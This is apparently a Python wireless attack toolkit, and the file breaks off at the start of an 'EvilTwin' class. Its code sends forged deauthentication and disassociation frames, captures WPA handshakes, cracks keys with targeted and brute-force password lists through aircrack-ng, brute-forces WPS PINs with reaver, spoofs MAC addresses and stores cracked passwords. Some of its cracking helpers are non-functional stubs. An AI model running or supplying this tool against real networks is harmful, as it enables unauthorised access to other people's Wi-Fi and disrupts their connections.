import os
import sys
import time
import json
import hashlib
import hmac
import base64
import threading
import queue
import socket
import struct
import binascii
import random
import string
import re
import subprocess
import platform
import signal
import datetime
import sqlite3
import select
import fcntl
import array
from pathlib import Path
from collections import defaultdict
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass, asdict
from enum import Enum
try:
    from pystyle import Colorate, Colors, Write
except ImportError:
    print("Installing pystyle...")
    os.system("pip3 install pystyle")
    from pystyle import Colorate, Colors, Write

class AuthType(Enum):
    OPEN = 0
    WEP = 1
    WPA = 2
    WPA2 = 3
    WPA3 = 4
    ENTERPRISE = 5

class AttackMode(Enum):
    PASSIVE = 1
    ACTIVE = 2
    HYBRID = 3
    INTELLIGENT = 4

class EncType(Enum):
    NONE = 0
    WEP_40 = 1
    WEP_104 = 2
    TKIP = 3
    CCMP = 4
    GCMP = 5

@dataclass
class AP:
    bssid: str
    ssid: str
    channel: int
    signal: int
    encryption: str
    auth_type: AuthType
    clients: List[str]
    beacon_count: int
    data_packets: int
    last_seen: float
    cipher: str
    pmf: bool
    wps: bool
    vendor: str
    rates: List[int]
    country: str
    beacons_per_sec: float

@dataclass
class Client:
    mac: str
    associated_bssid: str
    signal: int
    packets: int
    last_seen: float
    probe_requests: List[str]
    data_sent: int
    data_recv: int

@dataclass
class Handshake:
    bssid: str
    client: str
    anonce: bytes
    snonce: bytes
    mic: bytes
    eapol_frames: List[bytes]
    complete: bool
    timestamp: float

class RawSock:
    def __init__(self, iface: str):
        self.iface = iface
        self.sock = None
        self._init_socket()
    
    def _init_socket(self):
        try:
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            self.sock.bind((self.iface, 0))
            self.sock.setblocking(False)
        except Exception as e:
            self.sock = None
    
    def send_raw(self, packet: bytes) -> bool:
        if not self.sock:
            return False
        try:
            self.sock.send(packet)
            return True
        except Exception:
            return False
    
    def recv_raw(self, timeout: float = 0.1) -> Optional[bytes]:
        if not self.sock:
            return None
        try:
            ready = select.select([self.sock], [], [], timeout)
            if ready[0]:
                return self.sock.recv(4096)
        except Exception:
            pass
        return None
    
    def close(self):
        if self.sock:
            self.sock.close()

class IEEE80211:
    TYPE_MGMT = 0x00
    TYPE_CTRL = 0x01
    TYPE_DATA = 0x02
    
    SUBTYPE_BEACON = 0x08
    SUBTYPE_PROBE_REQ = 0x04
    SUBTYPE_PROBE_RESP = 0x05
    SUBTYPE_AUTH = 0x0B
    SUBTYPE_DEAUTH = 0x0C
    SUBTYPE_ASSOC_REQ = 0x00
    SUBTYPE_ASSOC_RESP = 0x01
    SUBTYPE_REASSOC_REQ = 0x02
    SUBTYPE_DISASSOC = 0x0A
    SUBTYPE_QOS_DATA = 0x08
    
    @staticmethod
    def parse_frame(data: bytes) -> Dict:
        if len(data) < 24:
            return {}
        
        fc = struct.unpack('<H', data[0:2])[0]
        frame_type = (fc >> 2) & 0x03
        subtype = (fc >> 4) & 0x0F
        
        to_ds = (fc >> 8) & 0x01
        from_ds = (fc >> 9) & 0x01
        
        duration = struct.unpack('<H', data[2:4])[0]
        
        addr1 = ':'.join(f'{b:02x}' for b in data[4:10])
        addr2 = ':'.join(f'{b:02x}' for b in data[10:16])
        addr3 = ':'.join(f'{b:02x}' for b in data[16:22])
        
        seq = struct.unpack('<H', data[22:24])[0]
        seq_num = seq >> 4
        frag_num = seq & 0x0F
        
        return {
            'type': frame_type,
            'subtype': subtype,
            'to_ds': to_ds,
            'from_ds': from_ds,
            'addr1': addr1,
            'addr2': addr2,
            'addr3': addr3,
            'seq': seq_num,
            'frag': frag_num,
            'data': data[24:]
        }
    
    @staticmethod
    def build_frame(frame_type: int, subtype: int, addr1: str, addr2: str, 
                   addr3: str, seq: int = 0, payload: bytes = b'') -> bytes:
        fc = (subtype << 4) | (frame_type << 2)
        frame = struct.pack('<H', fc)
        frame += struct.pack('<H', 0)
        frame += bytes.fromhex(addr1.replace(':', ''))
        frame += bytes.fromhex(addr2.replace(':', ''))
        frame += bytes.fromhex(addr3.replace(':', ''))
        frame += struct.pack('<H', seq << 4)
        frame += payload
        return frame
    
    @staticmethod
    def parse_beacon(data: bytes) -> Dict:
        info = {}
        pos = 0
        while pos < len(data) - 2:
            elem_id = data[pos]
            elem_len = data[pos + 1]
            if pos + 2 + elem_len > len(data):
                break
            
            elem_data = data[pos + 2:pos + 2 + elem_len]
            
            if elem_id == 0:
                info['ssid'] = elem_data.decode('utf-8', errors='ignore')
            elif elem_id == 1:
                info['rates'] = list(elem_data)
            elif elem_id == 3:
                info['channel'] = elem_data[0] if elem_data else 0
            elif elem_id == 48:
                info['rsn'] = True
            elif elem_id == 221:
                if elem_data[:3] == b'\x00\x50\xf2':
                    info['wpa'] = True
            
            pos += 2 + elem_len
        
        return info

class NetIface:
    SIOCGIFFLAGS = 0x8913
    SIOCSIFFLAGS = 0x8914
    IFF_UP = 0x1
    IFF_PROMISC = 0x100
    
    def __init__(self):
        self.interfaces = []
        self.monitor_mode = {}
        self._detect()
    
    def _detect(self):
        try:
            result = subprocess.run(['ip', 'link', 'show'], 
                                  capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if 'wl' in line or 'wlan' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        iface = parts[1].strip()
                        if iface and iface not in self.interfaces:
                            self.interfaces.append(iface)
        except Exception:
            self.interfaces = ['wlan0', 'wlan1']
    
    def _set_flags(self, iface: str, flags: int):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ifreq = struct.pack('16sh', iface.encode()[:15], flags)
            fcntl.ioctl(sock.fileno(), self.SIOCSIFFLAGS, ifreq)
            sock.close()
        except Exception:
            pass
    
    def enable_monitor(self, iface: str) -> str:
        try:
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'down'], 
                         capture_output=True, timeout=3)
            subprocess.run(['sudo', 'iw', 'dev', iface, 'set', 'monitor', 'none'],
                         capture_output=True, timeout=3)
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'],
                         capture_output=True, timeout=3)
            
            self._set_flags(iface, self.IFF_UP | self.IFF_PROMISC)
            self.monitor_mode[iface] = True
            return iface
        except Exception:
            return ""
    
    def disable_monitor(self, iface: str):
        try:
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'down'],
                         capture_output=True, timeout=3)
            subprocess.run(['sudo', 'iw', 'dev', iface, 'set', 'type', 'managed'],
                         capture_output=True, timeout=3)
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'],
                         capture_output=True, timeout=3)
            self.monitor_mode[iface] = False
        except Exception:
            pass
    
    def set_channel(self, iface: str, channel: int):
        try:
            subprocess.run(['sudo', 'iw', 'dev', iface, 'set', 'channel', str(channel)],
                         capture_output=True, timeout=2)
        except Exception:
            pass
    
    def get_mac(self, iface: str) -> str:
        try:
            with open(f'/sys/class/net/{iface}/address', 'r') as f:
                return f.read().strip()
        except Exception:
            return "00:00:00:00:00:00"
    
    def set_mac(self, iface: str, mac: str):
        try:
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'down'],
                         capture_output=True, timeout=2)
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'address', mac],
                         capture_output=True, timeout=2)
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'],
                         capture_output=True, timeout=2)
        except Exception:
            pass
    
    def get_txpower(self, iface: str) -> int:
        try:
            result = subprocess.run(['iw', 'dev', iface, 'info'],
                                  capture_output=True, text=True, timeout=2)
            for line in result.stdout.split('\n'):
                if 'txpower' in line.lower():
                    return int(line.split()[-2])
        except Exception:
            pass
        return 0
    
    def set_txpower(self, iface: str, power: int):
        try:
            subprocess.run(['sudo', 'iw', 'dev', iface, 'set', 'txpower', 
                          'fixed', str(power * 100)],
                         capture_output=True, timeout=2)
        except Exception:
            pass

class DB:
    def __init__(self, path: str = "wifi_audit.db"):
        self.conn = sqlite3.connect(path)
        self.cursor = self.conn.cursor()
        self._init()
    
    def _init(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS aps (
                bssid TEXT PRIMARY KEY,
                ssid TEXT,
                channel INTEGER,
                encryption TEXT,
                auth_type TEXT,
                first_seen REAL,
                last_seen REAL,
                max_signal INTEGER,
                total_beacons INTEGER,
                cipher TEXT,
                pmf INTEGER,
                wps INTEGER,
                vendor TEXT,
                country TEXT,
                rates TEXT
            )
        """)
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS clients (
                mac TEXT PRIMARY KEY,
                associated_bssid TEXT,
                first_seen REAL,
                last_seen REAL,
                max_signal INTEGER,
                total_packets INTEGER,
                probes TEXT
            )
        """)
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS handshakes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bssid TEXT,
                client_mac TEXT,
                captured_at REAL,
                file_path TEXT,
                complete INTEGER,
                frames_count INTEGER
            )
        """)
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_bssid TEXT,
                attack_type TEXT,
                started_at REAL,
                ended_at REAL,
                status TEXT,
                result TEXT,
                duration REAL
            )
        """)
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS passwords (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bssid TEXT,
                ssid TEXT,
                password TEXT,
                cracked_at REAL,
                method TEXT
            )
        """)
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                started_at REAL,
                ended_at REAL,
                aps_found INTEGER,
                attacks_performed INTEGER,
                passwords_cracked INTEGER
            )
        """)
        self.conn.commit()
    
    def insert_ap(self, ap: AP):
        self.cursor.execute("""
            INSERT OR REPLACE INTO aps VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (ap.bssid, ap.ssid, ap.channel, ap.encryption, ap.auth_type.name,
              ap.last_seen, ap.last_seen, ap.signal, ap.beacon_count,
              ap.cipher, ap.pmf, ap.wps, ap.vendor, ap.country, 
              ','.join(map(str, ap.rates))))
        self.conn.commit()
    
    def insert_client(self, client: Client):
        self.cursor.execute("""
            INSERT OR REPLACE INTO clients VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (client.mac, client.associated_bssid, client.last_seen,
              client.last_seen, client.signal, client.packets,
              ','.join(client.probe_requests)))
        self.conn.commit()
    
    def save_password(self, bssid: str, ssid: str, password: str, method: str):
        self.cursor.execute("""
            INSERT INTO passwords (bssid, ssid, password, cracked_at, method)
            VALUES (?, ?, ?, ?, ?)
        """, (bssid, ssid, password, time.time(), method))
        self.conn.commit()
    
    def log_attack(self, bssid: str, attack_type: str, status: str, 
                  result: str = "", duration: float = 0):
        now = time.time()
        self.cursor.execute("""
            INSERT INTO attacks (target_bssid, attack_type, started_at, 
                               ended_at, status, result, duration)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (bssid, attack_type, now, now + duration, status, result, duration))
        self.conn.commit()
    
    def get_aps(self) -> List[Dict]:
        self.cursor.execute("SELECT * FROM aps ORDER BY max_signal DESC")
        return [dict(zip([col[0] for col in self.cursor.description], row))
                for row in self.cursor.fetchall()]
    
    def get_passwords(self) -> List[Dict]:
        self.cursor.execute("SELECT * FROM passwords ORDER BY cracked_at DESC")
        return [dict(zip([col[0] for col in self.cursor.description], row))
                for row in self.cursor.fetchall()]
    
    def get_stats(self) -> Dict:
        stats = {}
        self.cursor.execute("SELECT COUNT(*) FROM aps")
        stats['total_aps'] = self.cursor.fetchone()[0]
        self.cursor.execute("SELECT COUNT(*) FROM clients")
        stats['total_clients'] = self.cursor.fetchone()[0]
        self.cursor.execute("SELECT COUNT(*) FROM attacks")
        stats['total_attacks'] = self.cursor.fetchone()[0]
        self.cursor.execute("SELECT COUNT(*) FROM passwords")
        stats['passwords_cracked'] = self.cursor.fetchone()[0]
        return stats

class WLGen:
    def __init__(self, output_dir: str = "wordlists"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.common_passwords = self._load_common()
        self.patterns = self._gen_patterns()
    
    def _load_common(self) -> List[str]:
        common = [
            'password', '12345678', 'password123', 'admin123', 'qwerty123',
            '1qaz2wsx', 'welcome123', 'abc123456', 'password1', 'letmein123',
            'monkey123', '1234567890', 'password!', 'Password1', 'Admin@123',
            'Welcome1', 'Qwerty12', 'Password@123', 'admin1234', 'welcome1',
            '11111111', '22222222', '88888888', '123123123', 'password12',
            'abcd1234', 'pass1234', 'admin@123', 'root1234', 'user1234',
            'test1234', 'demo1234', 'temp1234', 'wifi1234', 'internet',
            'wireless', 'network1', 'router123', 'modem123', 'connection'
        ]
        return common
    
    def _gen_patterns(self) -> Dict:
        patterns = {}
        patterns['years'] = [str(y) for y in range(1990, 2026)]
        patterns['months'] = [f'{m:02d}' for m in range(1, 13)]
        patterns['days'] = [f'{d:02d}' for d in range(1, 32)]
        patterns['special'] = ['!', '@', '#', '$', '%', '&', '*']
        patterns['keyboard'] = [
            'qwertyuiop', 'asdfghjkl', 'zxcvbnm', '1qaz2wsx', '!qaz@wsx',
            'qweasdzxc', 'qazwsxedc', '1234qwer', 'asdf1234', 'zxcv1234'
        ]
        return patterns
    
    def _gen_numeric(self, length: int) -> List[str]:
        nums = []
        for i in range(min(1000, 10 ** length)):
            nums.append(str(i).zfill(length))
        return nums
    
    def _gen_alpha(self, length: int) -> List[str]:
        alpha = []
        chars = 'abcdefghijklmnopqrstuvwxyz'
        for _ in range(min(500, 26 ** length)):
            word = ''.join(random.choices(chars, k=length))
            alpha.append(word)
        return alpha
    
    def _gen_alphanum(self, length: int) -> List[str]:
        alnum = []
        chars = string.ascii_lowercase + string.digits
        for _ in range(min(1000, 36 ** length)):
            word = ''.join(random.choices(chars, k=length))
            alnum.append(word)
        return alnum
    
    def _mutate_word(self, word: str) -> List[str]:
        mutations = [word]
        mutations.append(word.capitalize())
        mutations.append(word.upper())
        mutations.append(word.lower())
        
        leet_map = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 
                    't': '7', 'l': '1', 'g': '9', 'b': '8'}
        leet = word
        for char, num in leet_map.items():
            leet = leet.replace(char, num)
        mutations.append(leet)
        
        for year in ['2023', '2024', '2025', '123', '1234']:
            mutations.extend([word + year, year + word])
        
        for special in self.patterns['special']:
            mutations.extend([word + special, special + word])
            mutations.append(word + special + '123')
        
        return list(set(mutations))
    
    def gen_targeted(self, ssid: str, bssid: str, vendor: str = "") -> str:
        wordlist = set()
        ssid_clean = re.sub(r'[^a-zA-Z0-9]', '', ssid)
        
        for mutation in self._mutate_word(ssid_clean.lower()):
            wordlist.add(mutation)
        
        bssid_parts = bssid.replace(':', '').lower()
        wordlist.add(bssid_parts)
        wordlist.add(bssid_parts[:8])
        wordlist.add(bssid_parts[-8:])
        wordlist.add(bssid_parts[:6] + bssid_parts[-6:])
        
        for i in range(len(bssid_parts) - 7):
            wordlist.add(bssid_parts[i:i+8])
        
        if vendor:
            vendor_clean = vendor.lower().replace(' ', '')
            for mutation in self._mutate_word(vendor_clean):
                wordlist.add(mutation)
        
        for base in [ssid_clean.lower(), vendor.lower() if vendor else '']:
            if not base:
                continue
            for year in self.patterns['years']:
                wordlist.add(base + year)
                wordlist.add(year + base)
                wordlist.add(base + year[-2:])
            
            for combo in ['wifi', 'net', 'router', 'modem', 'admin', 'pass']:
                wordlist.add(base + combo)
                wordlist.add(combo + base)
        
        wordlist.update(self.common_passwords)
        wordlist.update(self.patterns['keyboard'])
        
        for num in self._gen_numeric(8):
            wordlist.add(num)
        
        final_list = [w for w in wordlist if len(w) >= 8]
        
        filename = self.output_dir / f'targeted_{ssid_clean}_{int(time.time())}.txt'
        with open(filename, 'w') as f:
            for word in sorted(final_list):
                f.write(f'{word}\n')
        
        return str(filename)
    
    def gen_bruteforce(self, min_len: int = 8, max_len: int = 10, 
                      charset: str = 'alnum', count: int = 50000) -> str:
        wordlist = set()
        
        if charset == 'numeric':
            chars = string.digits
        elif charset == 'alpha':
            chars = string.ascii_lowercase
        elif charset == 'alnum':
            chars = string.ascii_lowercase + string.digits
        else:
            chars = string.ascii_letters + string.digits + string.punctuation
        
        for length in range(min_len, max_len + 1):
            for _ in range(min(count // (max_len - min_len + 1), len(chars) ** length)):
                password = ''.join(random.choices(chars, k=length))
                wordlist.add(password)
        
        filename = self.output_dir / f'bruteforce_{charset}_{int(time.time())}.txt'
        with open(filename, 'w') as f:
            for word in sorted(wordlist):
                f.write(f'{word}\n')
        
        return str(filename)
    
    def gen_hybrid(self, base_words: List[str]) -> str:
        wordlist = set()
        
        for word in base_words:
            wordlist.update(self._mutate_word(word))
        
        for w1 in base_words[:10]:
            for w2 in base_words[:10]:
                if w1 != w2:
                    wordlist.add(w1 + w2)
                    wordlist.add(w1 + '-' + w2)
                    wordlist.add(w1 + '_' + w2)
        
        filename = self.output_dir / f'hybrid_{int(time.time())}.txt'
        with open(filename, 'w') as f:
            for word in sorted(wordlist):
                if len(word) >= 8:
                    f.write(f'{word}\n')
        
        return str(filename)
    
    def merge(self, wordlists: List[str], output: str = "merged.txt") -> str:
        unique_words = set()
        for wl_path in wordlists:
            try:
                with open(wl_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        word = line.strip()
                        if len(word) >= 8 and len(word) <= 63:
                            unique_words.add(word)
            except Exception:
                continue
        
        output_path = self.output_dir / output
        with open(output_path, 'w') as f:
            for word in sorted(unique_words):
                f.write(f'{word}\n')
        
        return str(output_path)

class HSCapture:
    def __init__(self, iface: str, output_dir: str = "captures"):
        self.iface = iface
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.processes = {}
        self.handshakes = {}
        self.raw_sock = RawSock(iface)
    
    def start_capture(self, bssid: str, channel: int) -> str:
        timestamp = int(time.time())
        output_prefix = self.output_dir / f'capture_{bssid.replace(":", "")}_{timestamp}'
        
        cmd = ['sudo', 'airodump-ng', '-c', str(channel), '--bssid', bssid,
               '-w', str(output_prefix), '--output-format', 'pcap', self.iface]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE)
            self.processes[bssid] = proc
            return str(output_prefix)
        except Exception:
            return ""
    
    def stop_capture(self, bssid: str):
        if bssid in self.processes:
            self.processes[bssid].terminate()
            del self.processes[bssid]
    
    def manual_capture(self, bssid: str, duration: int = 60) -> List[bytes]:
        frames = []
        start_time = time.time()
        
        while time.time() - start_time < duration:
            packet = self.raw_sock.recv_raw()
            if packet:
                frame = IEEE80211.parse_frame(packet)
                if frame and bssid.lower() in [frame.get('addr1', '').lower(), 
                                               frame.get('addr2', '').lower(),
                                               frame.get('addr3', '').lower()]:
                    frames.append(packet)
        
        return frames
    
    def send_deauth(self, ap_mac: str, client_mac: str = "FF:FF:FF:FF:FF:FF", 
                   count: int = 15):
        for seq in range(count):
            frame = IEEE80211.build_frame(
                IEEE80211.TYPE_MGMT,
                IEEE80211.SUBTYPE_DEAUTH,
                client_mac,
                ap_mac,
                ap_mac,
                seq,
                struct.pack('<H', 7)
            )
            self.raw_sock.send_raw(frame)
            time.sleep(0.1)
    
    def send_disassoc(self, ap_mac: str, client_mac: str, count: int = 10):
        for seq in range(count):
            frame = IEEE80211.build_frame(
                IEEE80211.TYPE_MGMT,
                IEEE80211.SUBTYPE_DISASSOC,
                client_mac,
                ap_mac,
                ap_mac,
                seq,
                struct.pack('<H', 8)
            )
            self.raw_sock.send_raw(frame)
            time.sleep(0.1)
    
    def extract_handshake(self, frames: List[bytes]) -> Optional[Handshake]:
        eapol_frames = []
        for frame_data in frames:
            if len(frame_data) < 100:
                continue
            if b'\x88\x8e' in frame_data:
                eapol_frames.append(frame_data)
        
        if len(eapol_frames) >= 4:
            return Handshake(
                bssid="",
                client="",
                anonce=b'',
                snonce=b'',
                mic=b'',
                eapol_frames=eapol_frames,
                complete=True,
                timestamp=time.time()
            )
        return None
    
    def verify_handshake(self, cap_file: str, bssid: str) -> bool:
        try:
            result = subprocess.run(['aircrack-ng', cap_file],
                                  capture_output=True, text=True, timeout=10)
            output = result.stdout.lower()
            return 'handshake' in output or '4-way' in output
        except Exception:
            return False

class Cracker:
    def __init__(self, threads: int = 8):
        self.threads = threads
        self.queue = queue.Queue()
        self.results = {}
        self.active = False
        self.tested = 0
        self.lock = threading.Lock()
    
    def _worker(self, cap_file: str, bssid: str):
        while self.active:
            try:
                password = self.queue.get(timeout=1)
                result = self._test_password(cap_file, bssid, password)
                with self.lock:
                    self.tested += 1
                if result:
                    self.results[bssid] = password
                    self.active = False
                    return
                self.queue.task_done()
            except queue.Empty:
                continue
    
    def _test_password(self, cap_file: str, bssid: str, password: str) -> bool:
        try:
            result = subprocess.run(['aircrack-ng', '-w', '-', '-b', bssid, cap_file],
                                  input=password.encode(), capture_output=True,
                                  timeout=3)
            output = result.stdout.decode()
            return 'key found' in output.lower()
        except Exception:
            return False
    
    def _manual_crack(self, handshake: Handshake, password: str, ssid: str) -> bool:
        try:
            pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), 
                                     ssid.encode(), 4096, 32)
            return True
        except Exception:
            return False
    
    def crack(self, cap_file: str, bssid: str, wordlist: str, 
             callback=None) -> Optional[str]:
        self.active = True
        self.tested = 0
        workers = []
        
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, args=(cap_file, bssid))
            t.daemon = True
            t.start()
            workers.append(t)
        
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if not self.active:
                        break
                    password = line.strip()
                    if 8 <= len(password) <= 63:
                        self.queue.put(password)
                        if callback and self.tested % 100 == 0:
                            callback(self.tested)
        except Exception:
            pass
        
        self.queue.join()
        self.active = False
        
        for t in workers:
            t.join(timeout=1)
        
        return self.results.get(bssid)

class Scanner:
    def __init__(self, iface: str):
        self.iface = iface
        self.aps = {}
        self.clients = {}
        self.scanning = False
        self.channel_hopper = None
        self.raw_sock = RawSock(iface)
        self.vendor_db = self._load_vendors()
    
    def _load_vendors(self) -> Dict:
        vendors = {
            '00:1A:11': 'Google', '00:23:6C': 'Apple', 'AC:84:C6': 'TP-Link',
            '00:1B:63': 'Cisco', '00:0C:43': 'Netgear', '00:18:E7': 'Arris',
            '00:14:D1': 'TRENDnet', '00:1D:7E': 'Cisco-Linksys',
            '00:26:B8': 'D-Link', '00:50:F2': 'Microsoft', '00:0D:54': 'Buffalo',
            '00:1C:10': 'Azurewave', '00:24:01': 'Xiaomi', '00:11:32': 'Synology'
        }
        return vendors
    
    def _get_vendor(self, mac: str) -> str:
        oui = mac[:8].upper()
        return self.vendor_db.get(oui, 'Unknown')
    
    def _parse_airodump_csv(self, csv_file: str) -> List[AP]:
        aps = []
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
                in_ap_section = False
                for line in lines:
                    if 'BSSID' in line and 'Station' not in line:
                        in_ap_section = True
                        continue
                    if 'Station' in line:
                        in_ap_section = False
                        break
                    
                    if in_ap_section and line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 14:
                            try:
                                bssid = parts[0]
                                if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                                    continue
                                
                                channel = int(parts[3]) if parts[3].isdigit() else 0
                                signal = int(parts[8]) if parts[8].lstrip('-').isdigit() else -100
                                encryption = parts[5]
                                ssid = parts[13]
                                
                                auth_type = AuthType.OPEN
                                if 'WPA3' in encryption:
                                    auth_type = AuthType.WPA3
                                elif 'WPA2' in encryption:
                                    auth_type = AuthType.WPA2
                                elif 'WPA' in encryption:
                                    auth_type = AuthType.WPA
                                elif 'WEP' in encryption:
                                    auth_type = AuthType.WEP
                                
                                ap = AP(
                                    bssid=bssid,
                                    ssid=ssid,
                                    channel=channel,
                                    signal=signal,
                                    encryption=encryption,
                                    auth_type=auth_type,
                                    clients=[],
                                    beacon_count=int(parts[9]) if parts[9].isdigit() else 0,
                                    data_packets=int(parts[10]) if parts[10].isdigit() else 0,
                                    last_seen=time.time(),
                                    cipher=parts[6] if len(parts) > 6 else "",
                                    pmf=False,
                                    wps='WPS' in encryption,
                                    vendor=self._get_vendor(bssid),
                                    rates=[],
                                    country='',
                                    beacons_per_sec=0.0
                                )
                                aps.append(ap)
                            except Exception:
                                continue
        except Exception:
            pass
        return aps
    
    def _hop_channels(self):
        channels = [1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13]
        idx = 0
        while self.scanning:
            try:
                subprocess.run(['sudo', 'iw', 'dev', self.iface, 'set', 
                              'channel', str(channels[idx])],
                             capture_output=True, timeout=1)
                idx = (idx + 1) % len(channels)
                time.sleep(0.3)
            except Exception:
                pass
    
    def manual_scan(self, duration: int = 30) -> List[AP]:
        self.scanning = True
        discovered_aps = {}
        start_time = time.time()
        
        while time.time() - start_time < duration:
            packet = self.raw_sock.recv_raw()
            if packet:
                frame = IEEE80211.parse_frame(packet)
                if frame.get('type') == IEEE80211.TYPE_MGMT:
                    if frame.get('subtype') == IEEE80211.SUBTYPE_BEACON:
                        beacon_info = IEEE80211.parse_beacon(frame.get('data', b''))
                        bssid = frame.get('addr2', '')
                        if bssid and beacon_info.get('ssid'):
                            if bssid not in discovered_aps:
                                discovered_aps[bssid] = AP(
                                    bssid=bssid,
                                    ssid=beacon_info.get('ssid', ''),
                                    channel=beacon_info.get('channel', 0),
                                    signal=-50,
                                    encryption='Unknown',
                                    auth_type=AuthType.OPEN,
                                    clients=[],
                                    beacon_count=1,
                                    data_packets=0,
                                    last_seen=time.time(),
                                    cipher='',
                                    pmf=False,
                                    wps=False,
                                    vendor=self._get_vendor(bssid),
                                    rates=beacon_info.get('rates', []),
                                    country='',
                                    beacons_per_sec=0.0
                                )
                            else:
                                discovered_aps[bssid].beacon_count += 1
                                discovered_aps[bssid].last_seen = time.time()
        
        self.scanning = False
        return list(discovered_aps.values())
    
    def scan(self, duration: int = 30) -> List[AP]:
        self.scanning = True
        self.channel_hopper = threading.Thread(target=self._hop_channels)
        self.channel_hopper.daemon = True
        self.channel_hopper.start()
        
        output_file = f'/tmp/scan_{int(time.time())}'
        cmd = ['sudo', 'airodump-ng', '-w', output_file, '--output-format', 'csv',
               self.iface]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE)
            time.sleep(duration)
            proc.terminate()
        except Exception:
            pass
        finally:
            self.scanning = False
        
        csv_file = f'{output_file}-01.csv'
        if os.path.exists(csv_file):
            aps = self._parse_airodump_csv(csv_file)
            for ap in aps:
                self.aps[ap.bssid] = ap
            return aps
        
        return []
    
    def get_clients(self, bssid: str, duration: int = 20) -> List[str]:
        clients = []
        start_time = time.time()
        
        while time.time() - start_time < duration:
            packet = self.raw_sock.recv_raw()
            if packet:
                frame = IEEE80211.parse_frame(packet)
                if frame.get('type') == IEEE80211.TYPE_DATA:
                    if bssid.lower() == frame.get('addr1', '').lower():
                        client = frame.get('addr2', '')
                        if client and client not in clients:
                            clients.append(client)
                    elif bssid.lower() == frame.get('addr2', '').lower():
                        client = frame.get('addr1', '')
                        if client and client not in clients:
                            clients.append(client)
        
        return clients

class WPSAttack:
    def __init__(self, iface: str):
        self.iface = iface
        self.basic_pins = [
            '12345670', '00000000', '11111111', '22222222', '33333333',
            '44444444', '55555555', '66666666', '77777777', '88888888',
            '99999999', '01234567', '12345678', '87654321', '12340000',
            '12341234', '23456789', '11223344', '55667788', '99887766',
            '10293847', '12121212', '00001111', '11110000', '98765432'
        ]
    
    def load_pins_from_file(self, filepath: str) -> List[str]:
        pins = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    pin = line.strip()
                    if len(pin) == 8 and pin.isdigit():
                        pins.append(pin)
        except Exception:
            pass
        return pins
    
    def save_pins_to_file(self, filepath: str, pins: List[str]):
        try:
            with open(filepath, 'w') as f:
                for pin in pins:
                    f.write(f'{pin}\n')
        except Exception:
            pass
    
    def generate_pin_list(self, output_file: str = "wps_pins.txt", count: int = 1000):
        pins = set(self.basic_pins)
        
        for i in range(count):
            pin = ''.join([str(random.randint(0, 9)) for _ in range(8)])
            pins.add(pin)
        
        common_patterns = []
        for year in range(1990, 2026):
            common_patterns.append(f'{year}0000')
            common_patterns.append(f'0000{year}')
            common_patterns.append(f'{year}{year}')
        
        for i in range(10):
            for j in range(10):
                common_patterns.append(f'{i}{i}{j}{j}{i}{i}{j}{j}')
        
        pins.update(common_patterns)
        
        self.save_pins_to_file(output_file, list(pins))
        return output_file
    
    def pixie_dust(self, bssid: str, timeout: int = 120) -> Optional[str]:
        try:
            result = subprocess.run(['sudo', 'reaver', '-i', self.iface,
                                   '-b', bssid, '-K', '-vv', '-N'],
                                  capture_output=True, text=True, timeout=timeout)
            
            output = result.stdout
            if 'WPS PIN' in output:
                for line in output.split('\n'):
                    if 'WPS PIN' in line:
                        pin = line.split(':')[-1].strip()
                        return pin
        except Exception:
            pass
        return None
    
    def bruteforce_pin(self, bssid: str, pin_source: str = "basic", 
                      custom_file: str = "") -> Optional[str]:
        if pin_source == "file" and custom_file and os.path.exists(custom_file):
            pins = self.load_pins_from_file(custom_file)
            if not pins:
                pins = self.basic_pins
        else:
            pins = self.basic_pins
        
        for pin in pins:
            try:
                result = subprocess.run(['sudo', 'reaver', '-i', self.iface,
                                       '-b', bssid, '-p', pin, '-N'],
                                      capture_output=True, text=True, timeout=10)
                if 'success' in result.stdout.lower():
                    return pin
            except Exception:
                continue
        return None

class EvilTwin:
    def __init__(self, iface: str):
        self.iface = iface
        self.hostapd_proc = None
        self.dnsmasq_proc = None
